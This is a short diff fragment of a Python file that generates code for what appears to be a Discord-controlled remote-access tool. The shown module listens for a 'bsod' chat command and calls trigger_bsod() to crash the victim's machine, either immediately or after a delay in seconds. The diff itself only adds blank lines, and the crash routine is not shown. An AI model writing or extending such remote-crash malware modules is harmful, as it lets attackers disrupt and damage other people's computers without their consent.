@@ -8,6 +8,7 @@
 # -BSOD -s <int> | send a BSOD in <int> seconds
 def get_code():
     return """
+
     # ADDED BSOD MODULE
     elif message.content.lower().startswith("bsod"):
     
@@ -53,4 +54,5 @@ def get_code():
             # No option provided: execute BSOD immediately
             await message.channel.send("Executing immediate BSOD...")
             trigger_bsod()
+            
 """
